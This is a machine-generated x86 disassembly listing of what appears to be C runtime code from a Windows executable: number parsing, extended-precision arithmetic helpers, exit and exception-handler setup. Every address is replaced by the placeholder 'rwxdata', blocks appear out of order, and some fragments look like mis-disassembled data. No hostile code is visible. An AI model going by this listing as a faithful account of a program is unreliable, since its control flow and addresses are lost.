mov [ ebp - 0x24 ] edx
jle rwxdata
lea ecx [ edi - 0x2 ]
cmp bl 0x31
mov [ ebp + 0x10 ] ecx
jl rwxdata
mov [ ebp - 0x20 ] edx
cmp bl 0x31
jl rwxdata
cmp [ ebp + 0x20 ] 0x0
je rwxdata
mov [ ebp - 0x20 ] 0x1
xor esi esi
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x4
jmp rwxdata
push 0x18
pop eax
cmp [ ebp - 0x4 ] eax
jbe rwxdata
mov bl [ edi ]
inc edi
cmp eax 0xb
ja rwxdata
cmp bl [ rwxdata ]
jne rwxdata
cmp bl 0x39
jg rwxdata
cmp bl [ rwxdata ]
je rwxdata
cmp bl 0x39
jle rwxdata
cmp bl [ rwxdata ]
je rwxdata
cmp bl 0x39
jle rwxdata
mov ecx [ rwxdata ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_40732d
pop ecx
pop ecx
push 0x1
pop edx
jmp rwxdata
cmp [ rwxdata ] edx
jle rwxdata
cmp bl 0x30
jne rwxdata
mov ecx [ rwxdata ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_40732d
pop ecx
pop ecx
push 0x1
pop edx
jmp rwxdata
movsx eax bl
sub eax 0x2b
je rwxdata
cmp bl 0x39
jle rwxdata
cmp bl 0x31
jl rwxdata
mov bl [ edi ]
inc edi
jmp rwxdata
cmp bl 0x30
jne rwxdata
cmp bl 0x39
jg rwxdata
push 0xa
dec edi
pop eax
movsx eax bl
lea ecx [ edi - 0x1 ]
sub eax 0x2b
mov [ ebp + 0x10 ] ecx
je rwxdata
mov ecx [ rwxdata ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_40732d
pop ecx
pop ecx
jmp rwxdata
mov ecx [ ebp + 0x8 ]
or eax [ ebp - 0x28 ]
pop edi
mov [ ecx + 0x6 ] esi
mov [ ecx + 0x2 ] ebx
mov [ ecx + 0xa ] ax
mov eax [ ebp - 0x14 ]
pop esi
mov [ ecx ] dx
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ ebp - 0x45 ] 0x5
jl rwxdata
movsx eax bl
sub eax 0x2b
je rwxdata
push 0x5
jmp rwxdata
push 0x3
jmp rwxdata
mov eax esi
jmp rwxdata
cmp bl 0x2b
je rwxdata
cmp bl 0x30
jne rwxdata
cmp bl [ rwxdata ]
jne rwxdata
cmp [ ebp - 0x4 ] 0x19
jae rwxdata
test eax eax
je rwxdata
mov ecx [ rwxdata ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax esi
movzx eax bl
push esi
push eax
call sub_40732d
pop ecx
pop ecx
push 0x1
pop edx
jmp rwxdata
dec [ ebp - 0x8 ]
mov bl [ edi ]
inc edi
jmp rwxdata
mov edi [ ebp + 0x10 ]
jmp rwxdata
mov eax esi
jmp rwxdata
test eax eax
je rwxdata
push 0x7
dec eax
dec eax
je rwxdata
push 0x9
dec edi
jmp rwxdata
cmp bl 0x39
jg rwxdata
cmp bl 0x30
jne rwxdata
jmp rwxdata
dec eax
dec eax
jne rwxdata
mov [ ebp - 0x1c ] esi
movsx ecx bl
lea eax [ esi + esi * 4 ]
lea esi [ ecx + eax * 2 - 0x30 ]
cmp esi 0x1450
jg rwxdata
test eax eax
je rwxdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
jmp rwxdata
dec eax
cmp [ eax ] 0x0
jne rwxdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
dec eax
inc [ ebp - 0x8 ]
jmp rwxdata
inc [ ebp - 0x45 ]
and [ ebp - 0x28 ] 0x0
push 0x2
pop eax
jmp rwxdata
dec eax
dec eax
je rwxdata
pop eax
jmp rwxdata
pop eax
dec edi
push 0xb
jmp rwxdata
cmp bl 0x2d
je rwxdata
mov eax edx
jmp rwxdata
cmp bl 0x2b
je rwxdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
mov [ eax ] bl
jmp rwxdata
cmp [ ebp - 0x4 ] 0x19
jae rwxdata
test eax eax
je rwxdata
dec edi
jmp rwxdata
or [ ebp - 0x18 ] 0xffffffff
push 0x7
pop eax
jmp rwxdata
sub eax 0x3
jne rwxdata
jmp rwxdata
push 0x8
jmp rwxdata
mov edi ecx
mov ecx [ rwxdata ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x4
movzx eax bl
push 0x4
push eax
call sub_40732d
pop ecx
pop ecx
jmp rwxdata
mov esi 0x1451
mov bl [ edi ]
inc edi
jmp rwxdata
cmp [ ebp - 0x2c ] 0x0
je rwxdata
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x5c ]
push [ ebp - 0x4 ]
push eax
call sub_40bc1e
mov eax [ ebp - 0x1c ]
xor ecx ecx
add esp 0xc
cmp [ ebp - 0x18 ] ecx
jge rwxdata
dec [ ebp - 0x4 ]
inc [ ebp - 0x8 ]
jmp rwxdata
cmp [ ebp - 0x4 ] 0x0
jbe rwxdata
push 0x2
mov [ ebp - 0x28 ] 0x8000
pop eax
jmp rwxdata
sub eax 0x3
jne rwxdata
cmp bl 0x30
je rwxdata
cmp bl 0x2d
je rwxdata
cmp [ rwxdata ] edx
jle rwxdata
mov bl [ edi ]
inc edi
jmp rwxdata
mov bl [ edi ]
inc edi
jmp rwxdata
mov eax [ ebp - 0xc ]
inc [ ebp - 0x4 ]
sub bl 0x30
inc [ ebp - 0xc ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
mov bl [ edi ]
inc edi
jmp rwxdata
test eax eax
je rwxdata
cmp [ rwxdata ] 0x1
jle rwxdata
cmp [ ebp - 0x30 ] 0x0
je rwxdata
xor ebx ebx
mov eax 0x7fff
mov esi 0x80000000
xor edx edx
mov [ ebp - 0x14 ] 0x2
jmp rwxdata
add eax [ ebp - 0x8 ]
cmp [ ebp - 0x20 ] ecx
jne rwxdata
neg eax
jmp rwxdata
cmp bl 0x43
jle rwxdata
jmp rwxdata
cmp [ rwxdata ] 0x1
jle rwxdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x1
cmp [ ebp - 0x24 ] ecx
jne rwxdata
add eax [ ebp + 0x18 ]
cmp bl 0x45
jle rwxdata
cmp eax 0x1450
jle rwxdata
sub eax [ ebp + 0x1c ]
push 0x6
jmp rwxdata
cmp bl 0x63
jle rwxdata
cmp eax 0xffffebb0
jge rwxdata
mov [ ebp - 0x2c ] 0x1
cmp bl 0x65
jg rwxdata
push [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_40c198
mov edx [ ebp - 0x40 ]
mov ebx [ ebp - 0x3e ]
mov esi [ ebp - 0x3a ]
mov eax [ ebp - 0x36 ]
add esp 0xc
jmp rwxdata
mov [ ebp - 0x30 ] 0x1
jmp rwxdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x10 ]
sub_40b98f
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
dec eax
dec eax
je rwxdata
mov esi [ rwxdata ]
mov eax rwxdata
dec eax
dec eax
je rwxdata
test esi esi
jne rwxdata
xor eax eax
jmp rwxdata
push edi
call sub_40babc
mov esi [ eax + 0x8 ]
add eax 0x8
pop ecx
jmp rwxdata
sub eax 0x4
je rwxdata
push ebx
push 0x8
pop ecx
cmp edi ecx
je rwxdata
push 0x3
call sub_406e7b
pop edi
pop esi
pop ebp
retn
cmp esi 0x1
jne rwxdata
sub eax 0x3
je rwxdata
mov ebx [ rwxdata ]
and [ rwxdata ] 0x0
cmp edi ecx
jne rwxdata
cmp edi 0xb
je rwxdata
sub eax 0x4
je rwxdata
and [ eax ] 0x0
cmp edi ecx
jne rwxdata
mov edx [ rwxdata ]
mov [ rwxdata ] 0x8c
mov [ ebp + 0x8 ] edx
jmp rwxdata
cmp edi 0x4
jne rwxdata
mov esi [ rwxdata ]
mov eax rwxdata
jmp rwxdata
sub eax 0x6
je rwxdata
push edi
call esi
cmp edi 0xb
pop ecx
je rwxdata
push [ rwxdata ]
push 0x8
call esi
pop ecx
pop ecx
jmp rwxdata
cmp edi ecx
jne rwxdata
mov ebx [ ebp + 0x8 ]
mov esi [ rwxdata ]
mov eax rwxdata
jmp rwxdata
dec eax
je rwxdata
cmp edi 0x8
mov [ rwxdata ] ebx
jne rwxdata
cmp edi 0x4
jne rwxdata
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
add ecx eax
cmp eax ecx
jge rwxdata
mov esi [ rwxdata ]
mov eax rwxdata
jmp rwxdata
or eax 0xffffffff
jmp rwxdata
xor eax eax
pop ebx
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
lea edx [ eax + eax * 2 ]
sub ecx eax
lea edx [ edx * 4 + rwxdata ]
and [ edx ] 0x0
add edx 0xc
dec ecx
jne rwxdata
jmp rwxdata
sub_40babc
mov edx [ esp + 0x4 ]
mov ecx [ rwxdata ]
cmp [ rwxdata ] edx
push esi
mov eax rwxdata
je rwxdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rwxdata ]
cmp eax ecx
jae rwxdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rwxdata ]
xor eax eax
cmp [ eax + 0x4 ] edx
je rwxdata
cmp [ eax + 0x4 ] edx
jne rwxdata
retn
add eax 0xc
cmp eax esi
jae rwxdata
sub_40bb10
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne rwxdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40bb44
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
xor eax eax
lea ecx [ edx + esi ]
cmp ecx edx
jb rwxdata
push 0x1
pop eax
cmp ecx esi
jae rwxdata
mov edx [ esp + 0x10 ]
pop esi
mov [ edx ] ecx
retn
sub_40bb65
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
push esi
push [ edi ]
push [ esi ]
call sub_40bb44
add esp 0xc
test eax eax
je rwxdata
lea eax [ esi + 0x4 ]
push eax
push [ edi + 0x4 ]
push [ eax ]
call sub_40bb44
add esp 0xc
test eax eax
je rwxdata
lea eax [ esi + 0x4 ]
push eax
push 0x1
push [ eax ]
call sub_40bb44
add esp 0xc
test eax eax
je rwxdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x8 ]
push [ eax ]
call sub_40bb44
add esp 0xc
pop edi
pop esi
retn
inc [ esi + 0x8 ]
inc [ esi + 0x8 ]
sub_40bbc3
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ecx esi
add esi esi
mov [ eax ] esi
lea esi [ edi + edi ]
shr ecx 0x1f
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
mov [ eax + 0x4 ] esi
shr edx 0x1f
shl ecx 0x1
or ecx edx
pop edi
mov [ eax + 0x8 ] ecx
pop esi
retn
sub_40bbf1
mov eax [ esp + 0x4 ]
push esi
push edi
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x4 ]
mov esi edx
mov edi ecx
shl esi 0x1f
shr ecx 0x1
or ecx esi
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
shl edi 0x1f
shr ecx 0x1
shr edx 0x1
or ecx edi
pop edi
mov [ eax + 0x8 ] edx
mov [ eax ] ecx
pop esi
retn
sub_40bc1e
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
xor edx edx
cmp eax edx
push esi
mov [ ebp - 0x4 ] 0x404e
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
jbe rwxdata
cmp [ ebx + 0x8 ] edx
jne rwxdata
push edi
mov [ ebp + 0x10 ] eax
mov esi 0x8000
mov ecx [ ebx + 0x4 ]
mov eax ecx
shr eax 0x10
mov [ ebx + 0x8 ] eax
mov eax [ ebx ]
mov esi eax
shr esi 0x10
shl ecx 0x10
or esi ecx
shl eax 0x10
add [ ebp - 0x4 ] 0xfff0
mov [ ebx + 0x4 ] esi
mov [ ebx ] eax
jmp rwxdata
mov esi ebx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call sub_40bbc3
push ebx
call sub_40bbc3
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_40bb65
push ebx
call sub_40bbc3
mov eax [ ebp + 0x8 ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
movsx eax [ eax ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_40bb65
add esp 0x1c
inc [ ebp + 0x8 ]
dec [ ebp + 0x10 ]
jne rwxdata
xor edx edx
pop edi
mov ax [ ebp - 0x4 ]
pop esi
mov [ ebx + 0xa ] ax
pop ebx
leave
retn
push ebx
call sub_40bbc3
add [ ebp - 0x4 ] 0xffff
pop ecx
jmp rwxdata
test [ ebx + 0x8 ] esi
jne rwxdata
sub_40bce5
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov ecx eax
mov esi 0x7fff
and ecx 0x8000
and eax esi
test cx cx
push edi
mov [ ebp - 0x1c ] 0xcc
mov [ ebp - 0x1b ] 0xcc
mov [ ebp - 0x1a ] 0xcc
mov [ ebp - 0x19 ] 0xcc
mov [ ebp - 0x18 ] 0xcc
mov [ ebp - 0x17 ] 0xcc
mov [ ebp - 0x16 ] 0xcc
mov [ ebp - 0x15 ] 0xcc
mov [ ebp - 0x14 ] 0xcc
mov [ ebp - 0x13 ] 0xcc
mov [ ebp - 0x12 ] 0xfb
mov [ ebp - 0x11 ] 0x3f
mov [ ebp - 0x4 ] 0x1
mov edx eax
je rwxdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp rwxdata
cmp dx si
jne rwxdata
test edi edi
jne rwxdata
mov edi [ ebp + 0xc ]
test dx dx
jne rwxdata
movzx eax dx
mov ecx edi
mov esi eax
shr ecx 0x18
imul eax eax 0x4d10
shr esi 0x8
and [ ebp - 0x10 ] 0x0
push 0x1
lea ecx [ esi + ecx * 2 ]
mov [ ebp - 0x6 ] dx
imul ecx ecx 0x4d
mov [ ebp - 0xa ] edi
lea esi [ ecx + eax - 0x134312f4 ]
mov eax [ ebp + 0x8 ]
sar esi 0x10
mov [ ebp - 0xe ] eax
movsx eax si
neg eax
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40c198
add esp 0xc
cmp [ ebp - 0x6 ] 0x3fff
jb rwxdata
mov eax 0x80000000
mov [ ebx ] 0x1
cmp edi eax
jne rwxdata
cmp [ ebp + 0x8 ] edi
jne rwxdata
test [ ebp + 0x18 ] 0x1
mov [ ebx ] si
je rwxdata
lea eax [ ebp - 0x1c ]
inc esi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40bf78
pop ecx
pop ecx
test edi 0x40000000
jne rwxdata
cmp [ ebp + 0x8 ] 0x0
je rwxdata
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
jmp rwxdata
mov edi [ ebp + 0x14 ]
mov edi [ ebp + 0x14 ]
movsx eax si
add edi eax
test edi edi
jg rwxdata
test cx cx
je rwxdata
push rwxdata
jmp rwxdata
and [ ebx + 0x5 ] 0x0
push 0x1
pop eax
jmp rwxdata
movzx esi [ ebp - 0x6 ]
sub esi 0x3ffe
and [ ebp - 0x6 ] 0x0
mov [ ebp + 0x1c ] 0x8
push 0x15
pop edi
cmp edi 0x15
jle rwxdata
jmp rwxdata
cmp edi eax
jne rwxdata
cmp edi 0xc0000000
jne rwxdata
lea eax [ ebx + 0x4 ]
push eax
call sub_407760
pop ecx
mov [ ebx + 0x3 ] 0x6
pop ecx
jmp rwxdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x10 ]
push eax
call sub_40bbc3
dec [ ebp + 0x1c ]
pop ecx
jne rwxdata
test esi esi
jge rwxdata
push rwxdata
cmp [ ebp + 0x8 ] 0x0
jne rwxdata
cmp [ ebp + 0x8 ] 0x0
jne rwxdata
and [ ebp - 0x4 ] 0x0
jmp rwxdata
lea ecx [ edi + 0x1 ]
lea eax [ ebx + 0x4 ]
test ecx ecx
mov [ ebp + 0x1c ] eax
jle rwxdata
neg esi
and esi 0xff
jle rwxdata
push rwxdata
push rwxdata
jmp rwxdata
mov eax [ ebp - 0x4 ]
mov cl [ eax - 0x1 ]
dec eax
dec eax
cmp cl 0x35
lea ecx [ ebx + 0x4 ]
jl rwxdata
mov [ ebp + 0x14 ] ecx
lea eax [ ebp - 0x10 ]
push eax
call sub_40bbf1
dec esi
pop ecx
jne rwxdata
lea eax [ ebx + 0x4 ]
push eax
call sub_407760
pop ecx
mov [ ebx + 0x3 ] 0x5
pop ecx
cmp eax ecx
jb rwxdata
cmp eax ecx
jb rwxdata
lea esi [ ebp - 0x10 ]
lea edi [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
movsd [ edi ] [ esi ]
call sub_40bbc3
lea eax [ ebp - 0x10 ]
push eax
call sub_40bbc3
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40bb65
lea eax [ ebp - 0x10 ]
push eax
call sub_40bbc3
mov al [ ebp - 0x5 ]
mov ecx [ ebp + 0x1c ]
and [ ebp - 0x5 ] 0x0
add esp 0x14
add al 0x30
inc [ ebp + 0x1c ]
dec [ ebp + 0x14 ]
mov [ ecx ] al
jne rwxdata
mov eax [ ebp + 0x1c ]
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ecx ] 0x30
cmp [ eax ] 0x30
jne rwxdata
inc eax
inc [ ebx ]
cmp [ eax ] 0x39
jne rwxdata
cmp eax ecx
jae rwxdata
dec eax
jmp rwxdata
cmp eax ecx
jae rwxdata
mov [ eax ] 0x30
dec eax
jmp rwxdata
sub al bl
sub al 0x3
mov [ ebx + 0x3 ] al
movsx eax al
and [ eax + ebx + 0x4 ] 0x0
inc [ eax ]
sub_40bf78
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov cx [ ebx + 0xa ]
xor eax eax
push edi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov ax [ esi + 0xa ]
mov edi ecx
mov edx 0x7fff
xor edi eax
and eax edx
and ecx edx
and edi 0x8000
cmp ax 0x7fff
lea edx [ ecx + eax ]
mov [ ebp + 0x8 ] edx
jae rwxdata
neg di
sbb edi edi
and [ esi + 0x4 ] 0x0
and edi 0x80000000
add edi 0x7fff8000
and [ esi ] 0x0
mov [ esi + 0x8 ] edi
cmp cx 0x7fff
jae rwxdata
cmp dx 0xbffd
ja rwxdata
cmp dx 0x3fbf
ja rwxdata
test ax ax
mov edx 0x7fffffff
jne rwxdata
xor eax eax
jmp rwxdata
xor eax eax
inc [ ebp + 0x8 ]
test [ esi + 0x8 ] edx
jne rwxdata
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
jmp rwxdata
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0xc ] 0x5
inc [ ebp + 0x8 ]
test [ ebx + 0x8 ] edx
jne rwxdata
xor eax eax
cmp [ esi + 0x4 ] eax
jne rwxdata
pop edi
pop esi
pop ebx
leave
retn
add [ ebp - 0x4 ] 0x2
inc [ ebp - 0x10 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x0
jg rwxdata
add eax esi
lea ecx [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x18 ] eax
cmp [ ebx + 0x4 ] eax
jne rwxdata
cmp cx ax
jne rwxdata
cmp [ esi ] eax
jne rwxdata
mov eax [ ebp - 0x10 ]
add eax eax
cmp [ ebp + 0xc ] 0x0
jle rwxdata
add [ ebp + 0x8 ] 0xc002
cmp [ ebp + 0x8 ] 0x0
jle rwxdata
add [ ebp - 0x8 ] 0x2
sub [ ebp - 0xc ] 0x2
dec [ ebp - 0x18 ]
jne rwxdata
mov eax [ ebp - 0x4 ]
inc [ eax ]
cmp [ ebx ] eax
jne rwxdata
jmp rwxdata
add [ ebp + 0x8 ] 0xffff
cmp [ ebp + 0x8 ] 0x0
jge rwxdata
test [ ebp - 0x19 ] 0x80
jne rwxdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
imul eax ecx
mov ecx [ ebp - 0x4 ]
add ecx 0xfffffffc
push ecx
push eax
push [ ecx ]
call sub_40bb44
add esp 0xc
test eax eax
je rwxdata
mov [ esi + 0xa ] ax
jmp rwxdata
cmp [ ebp - 0x24 ] 0x8000
ja rwxdata
movsx eax [ ebp + 0x8 ]
neg eax
add [ ebp + 0x8 ] eax
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jg rwxdata
lea eax [ ebp - 0x24 ]
push eax
call sub_40bbc3
add [ ebp + 0x8 ] 0xffff
pop ecx
cmp [ ebp + 0x8 ] 0x0
jg rwxdata
cmp [ ebp - 0x22 ] 0xffffffff
jne rwxdata
mov eax [ ebp - 0x24 ]
and eax 0x1ffff
cmp eax 0x18000
jne rwxdata
lea eax [ ebp - 0x24 ]
push eax
call sub_40bbf1
dec ebx
pop ecx
jne rwxdata
inc [ ebp - 0x14 ]
inc [ ebp - 0x22 ]
and [ ebp - 0x22 ] 0x0
cmp [ ebp - 0x1e ] 0xffffffff
jne rwxdata
mov eax [ ebp + 0x8 ]
cmp ax 0x7fff
jae rwxdata
test [ ebp - 0x24 ] 0x1
je rwxdata
cmp [ ebp - 0x14 ] 0x0
je rwxdata
mov cx [ ebp - 0x22 ]
or eax edi
mov [ esi ] cx
mov ecx [ ebp - 0x20 ]
mov [ esi + 0x2 ] ecx
mov ecx [ ebp - 0x1c ]
mov [ esi + 0x6 ] ecx
inc [ ebp - 0x1e ]
jmp rwxdata
and [ ebp - 0x1e ] 0x0
cmp [ ebp - 0x1a ] 0xffff
jne rwxdata
or [ ebp - 0x24 ] 0x1
inc [ ebp - 0x1a ]
jmp rwxdata
inc [ ebp + 0x8 ]
mov [ ebp - 0x1a ] 0x8000
jmp rwxdata
sub_40c198
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx rwxdata
xor ecx ecx
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je rwxdata
pop ebx
leave
retn
jge rwxdata
cmp [ ebp + 0x10 ] ecx
jne rwxdata
mov eax [ ebp + 0xc ]
mov ebx rwxdata
neg eax
mov [ ebp + 0xc ] eax
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je rwxdata
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
push esi
push edi
cmp [ ebp + 0xc ] ecx
jne rwxdata
lea eax [ eax + eax * 2 ]
cmp [ ebx + eax * 4 ] 0x8000
lea esi [ ebx + eax * 4 ]
jb rwxdata
mov eax [ ebp + 0xc ]
add ebx 0x54
sar [ ebp + 0xc ] 0x3
and eax 0x7
cmp eax ecx
je rwxdata
pop edi
pop esi
push esi
push [ ebp + 0x8 ]
call sub_40bf78
pop ecx
pop ecx
xor ecx ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0xa ]
lea esi [ ebp - 0xc ]
sub_4028ca
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] ah

sub_40546f
jmp [ edx - 0x59ffbf8e ]
sub_405b80
mov cl [ rwxdata ]
mov al 0x1
test al cl
jne rwxdata
jmp sub_405ba0
or cl al
mov [ rwxdata ] cl
sub_405ba0
push sub_405bb0
call sub_405f1b
pop ecx
retn
sub_405bb0
retn
sub_405be0
mov ecx [ ecx ]
test ecx ecx
je rwxdata
retn
call sub_405bc0
test eax eax
je rwxdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_405c00
mov cl [ rwxdata ]
mov al 0x1
test al cl
jne rwxdata
jmp sub_405c20
or cl al
mov [ rwxdata ] cl
sub_405c20
push sub_405bb0
call sub_405f1b
pop ecx
retn
sub_405c30
test [ rwxdata ] 0x1
jne rwxdata
call sub_405c5a
test [ rwxdata ] 0x1
jne rwxdata
or [ rwxdata ] 0x1
jmp sub_405c66
or [ rwxdata ] 0x1
sub_405c5a
push sub_405bb0
call sub_405f1b
pop ecx
retn
sub_405c66
push sub_405c72
call sub_405f1b
pop ecx
retn
sub_405c72
retn
sub_405c73
call sub_405c7d
jmp sub_405c7e
sub_405c7d
retn
sub_405c7e
push sub_405c8a
call sub_405f1b
pop ecx
retn
sub_405c8a
mov ecx rwxdata
jmp sub_405be0
sub_405c94
test [ rwxdata ] 0x1
jne rwxdata
call sub_405cbe
test [ rwxdata ] 0x1
jne rwxdata
or [ rwxdata ] 0x1
jmp sub_405cca
or [ rwxdata ] 0x1
sub_405cbe
push sub_405bb0
call sub_405f1b
pop ecx
retn
sub_405cca
push sub_405c72
call sub_405f1b
pop ecx
retn
sub_405cd6
test [ rwxdata ] 0x1
jne rwxdata
call sub_405d00
test [ rwxdata ] 0x1
jne rwxdata
or [ rwxdata ] 0x1
jmp sub_405d0c
or [ rwxdata ] 0x1
sub_405d00
push sub_405bb0
call sub_405f1b
pop ecx
retn
sub_405d0c
push sub_405c72
call sub_405f1b
pop ecx
retn
sub_405d18
test [ rwxdata ] 0x1
jne rwxdata
jmp sub_405d2d
or [ rwxdata ] 0x1
sub_405d2d
push sub_405c72
call sub_405f1b
pop ecx
retn
sub_405d39
test [ rwxdata ] 0x1
jne rwxdata
jmp sub_405d4e
or [ rwxdata ] 0x1
sub_405d4e
push sub_405bb0
call sub_405f1b
pop ecx
retn
sub_405db0
push 0x1
push [ esp + 0x8 ]
call sub_4068de
pop ecx
pop ecx
retn
sub_405de0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je rwxdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_405e6a
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_405de0
jne rwxdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne rwxdata
mov eax 0x1
sub_405e96
push ebx
push ecx
mov ebx rwxdata
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_405f1b
push [ esp + 0x4 ]
call sub_405eae
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_406419
cmp [ rwxdata ] 0x1
jne rwxdata
push [ esp + 0x4 ]
call sub_4095f9
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_4095c0
sub_4064bc
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_406815
int3
sub_406816
int3
sub_406817
int3
sub_406818
int3
sub_406819
int3
sub_40681a
int3
sub_40681b
int3
sub_40681c
int3
sub_406c1e
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_406c35
add esp 0x10
retn
sub_406e3d
mov eax [ rwxdata ]
test eax eax
je rwxdata
push rwxdata
push rwxdata
call sub_406f25
push rwxdata
push rwxdata
call sub_406f25
add esp 0x10
retn
call eax
sub_406e6a
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_406e8c
add esp 0xc
retn
sub_406e7b
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_406e8c
add esp 0xc
retn
sub_406f3f
call sub_406f57
call sub_409a01
mov [ rwxdata ] eax
call sub_4099b1
fnclex
retn
sub_406f56
retn
sub_406f57
mov eax sub_409def
mov [ rwxdata ] sub_409a84
mov [ rwxdata ] eax
mov [ rwxdata ] sub_409aea
mov [ rwxdata ] sub_409a2a
mov [ rwxdata ] sub_409ad2
mov [ rwxdata ] eax
retn
sub_4071ee
push 0x1
pop eax
retn
sub_4072a2
push 0x1
pop eax
retn
sub_407517
push 0x1
call sub_407520
pop ecx
retn
sub_407632
call sub_407517
cmp [ rwxdata ] 0x0
je rwxdata
retn
jmp sub_40a536
sub_4076d9
push 0x1
pop eax
retn
sub_40791a
push sub_4078d4
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rwxdata ] eax
retn
sub_40792b
push [ rwxdata ]
